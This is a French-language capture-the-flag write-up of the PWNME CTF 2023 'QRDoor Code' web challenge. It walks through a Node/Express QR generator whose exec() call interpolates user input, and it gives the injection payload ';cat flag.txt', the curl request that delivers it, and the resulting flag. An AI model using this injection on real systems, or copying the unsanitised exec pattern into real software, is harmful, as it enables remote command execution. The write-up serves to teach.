---
title: "QRDoor Code | PWNME CTF 2023"
date: 2023-05-06T12:00:00Z
description: "Voici un writeup complet du second challenge web du pwnme ctf"
tags: ["rce","php","injection"]
keywords: ["php", "injection","rce"]
---
[//]: <> (Wrote By Vozec 06/05/2023)
---

# Introduction du challenge:

```
A company needed a website, to generate QR Code. They asked for a freelance to do this job
Since the website is up, they've noticed weird behaviour on their server
They need you to audit their code and help them to resolve their problem
Flag is situed in /app/flag.txt
```

# Tree Viewer

Les sources de ce challenge sont fournies :
```bash
.
├── docker-compose.yml
├── Dockerfile
├── package.json
├── src
│   └── index.js
└── views
    └── index.ejs
```

On s'intéresse au contenu de l'application: ``index.js``  

*index.js*
```js
const cookieParser = require('cookie-parser')
const express = require('express')
const { exec } = require("child_process");
const qrcode = require('qrcode');

const PORT = process.env.PORT || 4560;

const app = express();
app.set('view engine', 'ejs');
app.use(express.json());
app.use(cookieParser());

class QRCode {
    constructor(value, defaultLength){
        this.value = value
        this.defaultLength = defaultLength
    }

    async getImage(){
        if(!this.value){
            // Use 'fortune' to generate a random funny line, based on the input size
            try {
                this.value = await execFortune(this.defaultLength)
            } catch (error) {
                this.value = 'Error while getting a funny line'
            }
        }
        return await qrcode.toDataURL(this.value).catch(err => 'error:(')
    }
}

app.get('/', async (req, res) => {
    res.render('index');
});

app.post('/generate', async (req, res) => {
    const { value } = req.body;
    try {
        let newQrCode;
        // If the length is too long, we use a default according to the length
        if (value.length > 150)
            newQrCode = new QRCode(null, value.lenght)
        else {
            newQrCode = new QRCode(String(value))
        }

        const code = await newQrCode.getImage()
        res.json({ code, data: newQrCode.value });
    } catch (error) {
        res.status(422).json({ message: "error", reason: 'Unknow error' });
    }
});

function execFortune(defaultLength) {
    return new Promise((resolve, reject) => {
     exec(`fortune -n ${defaultLength}`, (error, stdout, stderr) => {
      if (error) {
        reject(error);
      }
      resolve(stdout? stdout : stderr);
     });
    });
   }

app.listen(PORT, async () => {
    console.log(`QR Code Generator is running on port ${PORT}`);
});
```

C'est une application *express* avec un unique *endpoint*: ``/generate``.  
On passe en paramètre ce qui appelé ``value`` dans le code.  
En fonction de sa propriété ``length``, il va créer un object **QRCode** puis retourner le résultat de **QRCode.getImage()**.


On se rend compte que ``getImage()`` éxécute la fonction ``execFortune`` avec le paramètre **defaultLength**.

En regardant de plus prêt, on remarque que la fonction **execFortune** est vulnérable à une injection de commande:  
```js
exec(`fortune -n ${defaultLength}`, (error, stdout, stderr) ...)
```

Notre objectif est clair : créer un object ``QRcode`` avec une injection de commande dans le paramètre ``defaultLength`` pour obtenir une exécution de commande.


## Misconfiguration:

On se rend compte d'une erreur lors de la création de l'object QRcode:  
```js
if (value.length > 150)
    newQrCode = new QRCode(null, value.lenght)
else {
    newQrCode = new QRCode(String(value))
}
```
- value.length
- value.lenght

Il y a une faute d'orthographe ce qui permet d'avoir 2 paramètres différents :
- Un pour passer la condition :``if (value.length > 150)``
- Un pour RCE.

## Poc & Flag:

On peut donc envoyer un objet de la forme:  
```json
{
  "length":151,
  "lenght":";cat flag.txt"
}
```

On obtient :  

```bash
curl -X POST http://13.37.17.31:51731/generate \
  -H "Content-Type: application/json" \
  -d '{"value":{"length":151,"lenght":";cat flag.txt"}}' | jq
```


*Résultat*
```
{
  "code": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIQAAACECAYAAABRRIOnAAAAAklEQVR4AewaftIAAAOUSURBVO3BO47kWAADwcyHuv+VuWOsQUuAIFXPB4wwvzDzv8NMOcyUw0w5zJTDTDnMlMNMOcyUw0w5zJTDTDnMlMNMOcyUw0z58JDKT0pCU2lJaCpPJOGKSktCU/lJSXjiMFMOM+UwUz68LAlvUrlD5Y4kNJU7knBHEt6k8qbDTDnMlMNM+fBlKnck4Y4kNJWWhKbSVK6otCQ0lZaEO1TuSMI3HWbKYaYcZsqHv5zKE0m4otJU/mWHmXKYKYeZ8uEvl4QrKldUWhJaEppKS8K/5DBTDjPlMFM+fFkSfqckNJUnktBUWhLuSMKf5DBTDjPlMFM+vEzlJ6m0JDSVloSmckWlJeEJlT/ZYaYcZsphpnx4KAl/siT8Tkn4mxxmymGmHGbKh4dUWhKaypUkNJU7ktBUWhKaSktCU3mTSkvCFZWWhKZyJQlPHGbKYaYcZsqH30ylJeEnqbxJ5YpKS0JLQlNpSWgqbzrMlMNMOcyUDy9TaUloKneotCTcodKS0FSuJOFPloQ3HWbKYaYcZor5hReptCQ0lZaEptKS8JNU3pSEptKS0FSeSMITh5lymCmHmfLhIZUnVK6o3JGEKyotCVeScIdKU7miciUJTeWbDjPlMFMOM+XDQ0l4IglNpSWhqbQkXFH5JpWWhCsqd6i0JHzTYaYcZsphpphfeJHKlSQ0lTuS0FSuJOGKypUk3KFyJQlXVO5IwpsOM+UwUw4z5cNDKi0JTeVKEp5IwpuS0FRaEu5Iwh1JuEOlJeGJw0w5zJTDTPnwUBLuUGlJuKLSknCHypUkNJU7VK6o3JGEKyotCW86zJTDTDnMlA9floQnknBFpSWhJeGKypuScIdKU/mdDjPlMFMOM+XDQyo/KQlPqNyRhCdUWhKuJOGKSlNpSXjiMFMOM+UwUz68LAlvUnlCpSWhqbQkXFG5Iwl3qLQkXEnCmw4z5TBTDjPlw5ep3JGEO5LQVK6otCRcUWlJaCpN5ZuS0FRaEp44zJTDTDnMlA9/OZWWhDtU7lBpSWgqV5LQVK6o/KTDTDnMlMNM+fCPUbkjCXeo3JGEpvKmJLzpMFMOM+UwUz58WRK+KQlN5QmVJ5JwJQlNpSWhqbQkfNNhphxmymGmfHiZyk9SaUloKldUWhKuqLwpCXeoXEnCE4eZcpgph5lifmHmf4eZcpgph5lymCmHmXKYKYeZcpgph5lymCmHmXKYKYeZcpgph5nyH62of0GjkwIwAAAAAElFTkSuQmCC",
  "data": "PWNME{3asY_B4cKd0oR_93}\n"
}
```

```bash
PWNME{3asY_B4cKd0oR_93}
```
